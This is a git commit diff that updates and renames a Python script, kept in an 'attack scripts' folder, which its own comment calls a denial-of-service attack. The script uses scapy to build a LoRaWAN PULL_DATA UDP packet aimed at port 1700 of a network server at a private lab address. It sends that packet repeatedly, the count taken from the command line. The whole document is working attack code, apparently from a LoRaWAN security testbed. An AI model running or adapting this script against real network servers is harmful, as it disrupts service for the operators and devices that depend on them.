c22bc29dd85b2db72802e2bf68a729ea62a199ce
Axel Mat <72404877+lord-seam@users.noreply.github.com>
2023-05-18 20:53:50 +0200

    Update and rename pushdata_dos.py to pulldata_dos.py

--- attack scripts /pulldata_dos.py
+++ attack scripts /pulldata_dos.py
@@ -1,17 +1,21 @@
+#Denial of Service Attack Script that sends mutiple PULL_DATA headers to the Network Server 
+
+import sys
+import time
 from scapy.all import *
 
 # Define the destination address and port
 dest_addr = '192.168.56.104'
 dest_port = 1700
 
-# Define the payload as a string of hexadecimal characters
-#payload_hex = '02c0ad02b4562d94afcda48d'
+# Define the PULL_DATA payload as a string of hexadecimal characters
 
 payloadx = '02c0ad02b4562d94afcda48d'
 
 # Convert the payload to binary format using the bytes.fromhex() method
-#payload = bytes.fromhex(payload_hex)
+
 payload = bytes.fromhex(payloadx)
+
 # Define the IP and UDP headers
 ip = IP(dst=dest_addr)
 udp = UDP(dport=dest_port)
@@ -19,11 +23,11 @@ udp = UDP(dport=dest_port)
 # Construct the packet by combining the headers and payload
 packet = ip / udp / payload
 
-# Prompt the user to enter the number of times the packet should be sent
-num_times = int(input("Enter the number of times to send the packet: "))
+num_times = int(sys.argv[1])
 
 # Send the packet to the destination IP address and port the specified number of times
 for i in range(num_times):
-    send(packet)
+    send(packet) 
+    time.sleep(3)
 
-print("Packets sent!")
+print(f"Packets sent: {num_times}")
